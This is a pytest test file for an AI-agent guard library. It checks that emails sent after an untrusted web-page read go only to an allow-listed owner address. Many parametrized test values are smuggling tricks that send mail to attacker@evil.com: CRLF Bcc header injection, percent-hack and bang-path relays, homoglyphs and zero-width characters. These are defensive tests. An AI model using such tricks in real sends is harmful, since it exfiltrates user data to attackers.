"""Argument-level flow exemptions: FlowPolicy.allow_args and flow_allow receipts.

The scenario these exist for: "read this page, summarize it, email me". The
tool-level rule blocks the send because a read came first; the exemption lets
it through for the owner's address only — and must keep blocking every way an
attacker could smuggle a second recipient into the same call.
"""

from __future__ import annotations

import pytest

import agentbrake
from agentbrake import AgentBrakeInterrupt, FlowPolicy, InterruptReason, block_exfiltration, receipts
from agentbrake import export as export_mod
from agentbrake import report as report_mod
from agentbrake.flow import FlowRuleDetector, normalize_address
from agentbrake.types import RunState, TaintMark, ToolCall

OWNER = "moi@example.com"
ATTACKER = "attacker@evil.com"
TOOLS = ["read_webpage", "send_email"]


def owner_policy(**overrides) -> FlowPolicy:
    kwargs = dict(
        fields=["to", "cc", "bcc"],
        values=[OWNER],
        other_fields=["subject", "body"],
    )
    kwargs.update(overrides)
    return block_exfiltration(
        untrusted_readers=["read_webpage"], egress_tools=["send_email"]
    ).allow_args("send_email", **kwargs)


def tainted_state() -> RunState:
    state = RunState()
    state.taints.append(TaintMark(label="untrusted", source_tool="read_webpage", call_index=0))
    return state


def verdict(args: dict, policy: FlowPolicy | None = None):
    """FLOW if blocked, None if allowed — for a call made after an untrusted read."""
    detector = FlowRuleDetector(policy or owner_policy())
    return detector.check(tainted_state(), ToolCall(name="send_email", args=args))


def failure(args: dict, policy: FlowPolicy | None = None) -> dict:
    detector = FlowRuleDetector(policy or owner_policy())
    flow = detector.explain(tainted_state(), ToolCall(name="send_email", args=args))
    return flow["exemption"]


@agentbrake.guard()
def dispatch(name: str, args: dict) -> str:
    return f"{name}-ok"


def _kinds(run: agentbrake.Run) -> list:
    return [row["attestation"]["kind"] for row in run.flow_receipts()]


# --- the required scenarios ------------------------------------------------

def test_owner_is_allowed_after_an_untrusted_read():
    assert verdict({"to": OWNER, "subject": "s", "body": "summary"}) is None


def test_attacker_is_blocked():
    assert verdict({"to": ATTACKER, "body": "summary"}) is InterruptReason.FLOW
    assert failure({"to": ATTACKER}) == {
        "tool": "send_email",
        "allowed": False,
        "field": "to",
        "value": ATTACKER,
        "value_digest": receipts._digest(ATTACKER),  # same canonical digest as receipts
        "reason": "recipient not in the allow-list",
    }


def test_owner_in_to_plus_attacker_in_bcc_is_blocked():
    args = {"to": OWNER, "bcc": ATTACKER, "body": "summary"}
    assert verdict(args) is InterruptReason.FLOW
    f = failure(args)
    assert (f["field"], f["value"]) == ("bcc", ATTACKER)


def test_mixed_list_is_blocked():
    assert verdict({"to": [OWNER, ATTACKER]}) is InterruptReason.FLOW
    assert failure({"to": [OWNER, ATTACKER]})["value"] == ATTACKER
    assert verdict({"cc": (OWNER, ATTACKER), "to": OWNER}) is InterruptReason.FLOW


def test_list_of_owner_only_is_allowed():
    assert verdict({"to": [OWNER, OWNER], "cc": (OWNER,)}) is None


@pytest.mark.parametrize("variant", [" MOI@Example.COM", "moi@EXAMPLE.com\t", "\t Moi@example.com  "])
def test_case_and_surrounding_whitespace_are_normalized(variant):
    assert verdict({"to": variant}) is None


def test_allow_list_entries_are_normalized_too():
    policy = owner_policy(values=["  MOI@Example.Com "])
    assert verdict({"to": OWNER}, policy) is None


@pytest.mark.parametrize("field", ["reply_to", "recipients", "To", "attachments"])
def test_unexpected_field_is_blocked(field):
    args = {"to": OWNER, field: ATTACKER}
    assert verdict(args) is InterruptReason.FLOW
    assert failure(args)["field"] == field


def test_unexpected_field_blocks_even_with_a_harmless_value():
    # Fail-closed on the field, not on what it happens to hold this time.
    assert verdict({"to": OWNER, "headers": {}}) is InterruptReason.FLOW


@pytest.mark.parametrize(
    "value",
    [42, 4.2, True, {"address": OWNER}, [[OWNER]], [OWNER, None], b"moi@example.com", {OWNER}],
)
def test_value_of_unexpected_type_is_blocked(value):
    assert verdict({"to": value}) is InterruptReason.FLOW


def test_other_fields_are_not_inspected():
    # The exemption bounds the destination, not the content (documented limit).
    assert verdict({"to": OWNER, "body": f"also tell {ATTACKER}"}) is None


# --- tricks a lax parser would let through ---------------------------------

@pytest.mark.parametrize(
    "value",
    [
        f"{OWNER}, {ATTACKER}",  # two recipients in one string
        f"{OWNER};{ATTACKER}",
        f"{OWNER}\r\nBcc: {ATTACKER}",  # header injection
        f"{OWNER}\nbcc:{ATTACKER}",
        f"Moi <{OWNER}>",  # display name
        f"<{OWNER}>",
        f'"{ATTACKER}"@example.com',  # quoted local part
        "attacker%evil.com@example.com",  # percent-hack relay
        "evil.com!attacker@example.com",  # bang path
        f"@example.com:{ATTACKER}",  # source route
        "mоi@example.com",  # Cyrillic 'o' homoglyph
        "ｍoi@example.com",  # fullwidth 'm'
        "moi@example.com​",  # zero-width space
        "moi%40example.com",  # percent-encoded '@'
        "=?utf-8?q?moi=40example.com?=",  # RFC 2047 encoded word
        "moi@example.com.",  # trailing-dot domain
        "moi@[127.0.0.1]",  # IP literal
        "moi@localhost",  # single label
        "moi..x@example.com",
        "moi @example.com",
        "\x00moi@example.com",
    ],
)
def test_parsing_tricks_are_refused(value):
    assert verdict({"to": value}) is InterruptReason.FLOW


def test_near_duplicates_of_the_owner_are_blocked():
    for value in ["moi+x@example.com", "mo1@example.com", "moi@example.co", "moi@example.com.evil.com"]:
        assert verdict({"to": value}) is InterruptReason.FLOW, value


def test_overlong_values_are_truncated_in_explain():
    secret = "s" * 1000 + "@evil.com"
    f = failure({"to": secret})
    assert len(f["value"]) < 300
    assert f["value"].endswith("chars)")


def test_a_call_with_no_recipient_is_blocked():
    # The tool may fall back to a built-in destination nobody checked.
    assert verdict({"body": "summary"}) is InterruptReason.FLOW
    assert verdict({"to": None, "cc": "", "bcc": [], "body": "x"}) is InterruptReason.FLOW
    assert failure({"body": "x"})["reason"] == "no recipient in any declared field"


def test_empty_optional_fields_do_not_block_an_owner_send():
    assert verdict({"to": OWNER, "cc": None, "bcc": "", "subject": "s"}) is None
    assert verdict({"to": OWNER, "cc": [], "bcc": "  "}) is None


def test_empty_string_inside_a_list_is_refused():
    assert verdict({"to": [OWNER, ""]}) is InterruptReason.FLOW


# --- domains ----------------------------------------------------------------

def test_domain_matcher_is_exact():
    policy = owner_policy(values=[], domains=["Corp.Example"])
    assert verdict({"to": "alice@corp.example", "cc": ["Bob@CORP.example"]}, policy) is None
    for value in ["a@evil.corp.example", "a@corp.example.evil.com", "a@xcorp.example"]:
        assert verdict({"to": value}, policy) is InterruptReason.FLOW, value


def test_percent_hack_cannot_ride_on_an_allowed_domain():
    policy = owner_policy(values=[], domains=["example.com"])
    assert verdict({"to": "attacker%evil.com@example.com"}, policy) is InterruptReason.FLOW


# --- declaration errors -----------------------------------------------------

def test_validate_rejects_an_exemption_on_a_non_sink():
    policy = block_exfiltration(["read_webpage"], ["send_email"]).allow_args(
        "send_mail", fields=["to"], values=[OWNER]
    )
    with pytest.raises(ValueError, match="'send_mail' is not a declared sink"):
        policy.validate()


def test_attaching_an_exemption_on_a_non_sink_fails_the_run():
    policy = block_exfiltration(["read_webpage"], ["send_email"]).allow_args(
        "read_webpage", fields=["to"], values=[OWNER]
    )
    with pytest.raises(ValueError, match="cannot apply"):
        agentbrake.run(allowed_tools=TOOLS, budget_usd=1.0, flow_policy=policy)


def test_empty_allow_list_is_refused():
    with pytest.raises(ValueError, match="both empty"):
        block_exfiltration(["read_webpage"], ["send_email"]).allow_args(
            "send_email", fields=["to"], values=[]
        )


def test_validate_catches_an_emptied_exemption():
    # Defense in depth: validate() re-checks what the builder already refused.
    from agentbrake.flow import ArgExemption

    policy = block_exfiltration(["read_webpage"], ["send_email"])
    policy._exemptions["send_email"] = ArgExemption(
        tool="send_email", fields=("to",), values=(), domains=(), other_fields=()
    )
    with pytest.raises(ValueError, match="both empty"):
        policy.validate()


@pytest.mark.parametrize("bad", ["Moi <moi@example.com>", "moi@localhost", "mоi@example.com", ""])
def test_malformed_allow_list_entries_are_refused(bad):
    with pytest.raises(ValueError, match="invalid allow-list entry|non-empty"):
        owner_policy(values=[bad])


def test_bare_string_arguments_are_refused():
    with pytest.raises(TypeError, match="bare string"):
        owner_policy(fields="to")
    with pytest.raises(TypeError, match="bare string"):
        owner_policy(values=OWNER)


def test_duplicate_and_overlapping_declarations_are_refused():
    with pytest.raises(ValueError, match="already declared"):
        owner_policy().allow_args("send_email", fields=["to"], values=[OWNER])
    with pytest.raises(ValueError, match="overlap"):
        owner_policy(other_fields=["to", "body"])
    with pytest.raises(ValueError, match="at least one"):
        owner_policy(fields=[])


def test_normalize_address_is_public_and_strict():
    assert normalize_address("  Moi@Example.com\t") == OWNER
    with pytest.raises(ValueError):
        normalize_address("moi@example.com\r\n")


# --- serialization / policy digest ------------------------------------------

def test_policy_without_exemptions_serializes_exactly_as_before():
    policy = block_exfiltration(["read_webpage"], ["send_email"])
    legacy = {
        "sources": {"read_webpage": "untrusted"},
        "sinks": {"send_email": "egress"},
        "deny": [["untrusted", "egress"]],
    }
    assert policy.to_dict() == legacy
    assert receipts.policy_digest(policy.to_dict()) == receipts.policy_digest(legacy)


def test_exemption_is_serialized_normalized_and_sorted():
    data = owner_policy(values=["Z@example.com", " moi@EXAMPLE.com"]).to_dict()
    assert data["allow_args"] == [
        {
            "tool": "send_email",
            "kind": "email",
            "fields": ["bcc", "cc", "to"],
            "values": ["moi@example.com", "z@example.com"],
            "domains": [],
            "other_fields": ["body", "subject"],
        }
    ]


def test_policy_digest_changes_when_the_allow_list_changes():
    digest = lambda p: receipts.policy_digest(p.to_dict())  # noqa: E731
    base = digest(block_exfiltration(["read_webpage"], ["send_email"]))
    owner = digest(owner_policy())
    other = digest(owner_policy(values=["toi@example.com"]))
    wider = digest(owner_policy(values=[OWNER, "toi@example.com"]))
    by_domain = digest(owner_policy(domains=["example.com"]))
    fewer_fields = digest(owner_policy(fields=["to"]))
    assert len({base, owner, other, wider, by_domain, fewer_fields}) == 6
    # Same allow-list written differently -> same digest.
    assert owner == digest(owner_policy(values=["  MOI@example.com"], fields=["bcc", "to", "cc"]))


# --- end to end through @guard, receipts --------------------------------------

def test_owner_send_runs_and_mints_a_verifiable_flow_allow_receipt():
    policy = owner_policy()
    args = {"to": OWNER, "subject": "Résumé", "body": "summary"}
    with agentbrake.run(allowed_tools=TOOLS, budget_usd=1.0, flow_policy=policy) as r:
        dispatch("read_webpage", {"url": "https://example.org"})
        assert dispatch("send_email", args) == "send_email-ok"

    assert _kinds(r) == ["flow_allow"]
    ok, err = r.verify_receipts()
    assert ok, err
    att = r.flow_receipts()[0]["attestation"]
    assert att["decision"] == "allow_by_policy"
    assert att["tool"] == "send_email"
    assert att["tool_args_digest"] == receipts.sink_call_digest(
        ToolCall(name="send_email", args=args)
    )
    assert att["policy_digest"] == receipts.policy_digest(policy.to_dict())
    assert att["flow"]["violated_taints"] == ["untrusted"]
    assert att["flow"]["tainted_by"][0]["source_tool"] == "read_webpage"
    assert att["flow"]["exemption"] == {
        "tool": "send_email",
        "allowed": True,
        "fields": ["bcc", "cc", "to"],
        "recipients": 1,
    }
    # No raw recipient in the receipt, only its digest.
    assert OWNER not in r.flow_receipts()[0]["attestation_json"]
    assert [c.name for c in r.state.calls] == ["read_webpage", "send_email"]


def test_attacker_send_is_blocked_and_the_receipt_names_the_culprit():
    with agentbrake.run(allowed_tools=TOOLS, budget_usd=1.0, flow_policy=owner_policy()) as r:
        dispatch("read_webpage", {"url": "https://example.org"})
        with pytest.raises(AgentBrakeInterrupt) as ei:
            dispatch("send_email", {"to": OWNER, "bcc": ATTACKER, "body": "summary"})

    assert ei.value.reason is InterruptReason.FLOW
    # The operator sees the value...
    shown = ei.value.context["flow"]["exemption"]
    assert (shown["field"], shown["value"]) == ("bcc", ATTACKER)
    assert _kinds(r) == ["flow_block"]
    # ...the signed receipt commits to it by digest only (receipts never hold
    # raw arguments), naming the field and the reason in clear.
    row = r.flow_receipts()[0]
    signed = row["attestation"]["flow"]["exemption"]
    assert signed == {
        "tool": "send_email",
        "allowed": False,
        "field": "bcc",
        "value_digest": receipts._digest(ATTACKER),
        "reason": "recipient not in the allow-list",
    }
    assert ATTACKER not in row["attestation_json"]
    assert r.verify_receipts()[0]
    assert [c.name for c in r.state.calls] == ["read_webpage"]


def test_receipts_without_a_failed_exemption_are_unchanged():
    flow = {"sink": "send_email", "violated_taints": ["untrusted"], "tainted_by": []}
    assert receipts.flow_for_receipt(flow) is flow
    with_pass = dict(flow, exemption={"tool": "send_email", "allowed": True, "recipients": 1})
    assert receipts.flow_for_receipt(with_pass) is with_pass


def test_override_receipt_also_drops_the_raw_value(monkeypatch):
    class FakeClient:
        def __init__(self, api_url, *a, **kw):
            pass

        def submit_interrupt(self, run_id, reason, context):
            return "int-1", "http://local/x"

        def wait_for_decision(self, interrupt_id, timeout=300.0, poll_interval=2.0):
            return "approved"

        def close(self):
            pass

    monkeypatch.setattr(agentbrake, "AgentBrakeClient", FakeClient)
    with agentbrake.run(
        allowed_tools=TOOLS, budget_usd=1.0, flow_policy=owner_policy(), mode="remote"
    ) as r:
        dispatch("read_webpage", {"url": "https://example.org"})
        dispatch("send_email", {"to": ATTACKER})
    row = r.flow_receipts()[0]
    assert row["attestation"]["kind"] == "flow_override"
    assert "value" not in row["attestation"]["flow"]["exemption"]
    assert ATTACKER not in row["attestation_json"]


def test_untainted_send_is_untouched_by_the_exemption():
    # No denied flow -> nothing to exempt, nothing to receipt; the exemption is
    # not a recipient allow-list for clean runs (backward compatible).
    with agentbrake.run(allowed_tools=TOOLS, budget_usd=1.0, flow_policy=owner_policy()) as r:
        assert dispatch("send_email", {"to": ATTACKER, "x": 1}) == "send_email-ok"
    assert _kinds(r) == []


def test_no_receipt_is_minted_when_a_later_detector_blocks_the_call():
    # Two calls cost 0.02; a 0.015 budget lets the read through and stops the send
    # on BudgetDetector, which runs after the flow detector.
    with agentbrake.run(allowed_tools=TOOLS, budget_usd=0.015, flow_policy=owner_policy()) as r:
        dispatch("read_webpage", {"url": "https://example.org"})
        with pytest.raises(AgentBrakeInterrupt) as ei:
            dispatch("send_email", {"to": OWNER})
    assert ei.value.reason is InterruptReason.BUDGET
    assert _kinds(r) == ["budget"]


def test_every_allowed_send_is_chained():
    with agentbrake.run(allowed_tools=TOOLS, budget_usd=1.0, flow_policy=owner_policy()) as r:
        dispatch("read_webpage", {"url": "https://example.org"})
        dispatch("send_email", {"to": OWNER, "body": "1"})
        dispatch("send_email", {"to": [OWNER], "body": "2"})
        with pytest.raises(AgentBrakeInterrupt):
            dispatch("send_email", {"to": ATTACKER, "body": "3"})
    assert _kinds(r) == ["flow_allow", "flow_allow", "flow_block"]
    assert r.verify_receipts()[0]
    digests = {row["attestation"]["tool_args_digest"] for row in r.flow_receipts()}
    assert len(digests) == 3


def test_exempt_call_does_not_reach_the_human_in_remote_mode(monkeypatch):
    submitted: list = []

    class FakeClient:
        def __init__(self, api_url, *a, **kw):
            pass

        def submit_interrupt(self, run_id, reason, context):
            submitted.append(context["pending_call"]["args"])
            return f"int-{len(submitted)}", "http://local/x"

        def wait_for_decision(self, interrupt_id, timeout=300.0, poll_interval=2.0):
            return "approved"

        def close(self):
            pass

    monkeypatch.setattr(agentbrake, "AgentBrakeClient", FakeClient)
    with agentbrake.run(
        allowed_tools=TOOLS, budget_usd=1.0, flow_policy=owner_policy(), mode="remote"
    ) as r:
        dispatch("read_webpage", {"url": "https://example.org"})
        dispatch("send_email", {"to": OWNER})  # exempt: no interrupt at all
        dispatch("send_email", {"to": ATTACKER})  # not exempt: a human approves it
    assert submitted == [{"to": ATTACKER}]
    # The human-approved one is an override, never also a policy allow.
    assert _kinds(r) == ["flow_allow", "flow_override"]


def test_report_counts_flow_allows_apart_from_human_decisions():
    with agentbrake.run(allowed_tools=TOOLS, budget_usd=1.0, flow_policy=owner_policy()) as r:
        dispatch("read_webpage", {"url": "https://example.org"})
        dispatch("send_email", {"to": OWNER})
        with pytest.raises(AgentBrakeInterrupt):
            dispatch("send_email", {"to": ATTACKER})
    bundle = export_mod.build_export(r.flow_receipts(), signer=export_mod.default_signer())
    verification = export_mod.verify_export(bundle)
    rep = report_mod.build_report(bundle, verification)
    assert rep["summary"]["flow_allows"] == 1
    assert rep["summary"]["autonomous_blocks"] == 1
    assert rep["human_decisions"] == []
    assert rep["summary"]["by_reason"] == {"flow": 1}
    text = report_mod.render_markdown(rep)
    assert "Flows allowed by policy exemption" in text


def test_example_09_runs_end_to_end(tmp_path):
    import os
    import subprocess
    import sys
    from pathlib import Path

    demo = Path(__file__).resolve().parent.parent / "examples" / "09_allow_owner_email.py"
    env = dict(os.environ, PYTHONIOENCODING="utf-8")
    result = subprocess.run(
        [sys.executable, str(demo)],
        cwd=tmp_path,
        env=env,
        capture_output=True,
        text=True,
        encoding="utf-8",
        timeout=120,
    )
    assert result.returncode == 0, result.stdout + result.stderr
    lines = result.stdout.splitlines()
    assert lines[0].startswith("SENT") and OWNER in lines[0]
    assert lines[1].startswith("BLOCKED") and f"to={ATTACKER}" in lines[1]
    assert lines[2].startswith("BLOCKED") and f"bcc={ATTACKER}" in lines[2]
    assert "verify_chain -> OK" in result.stdout
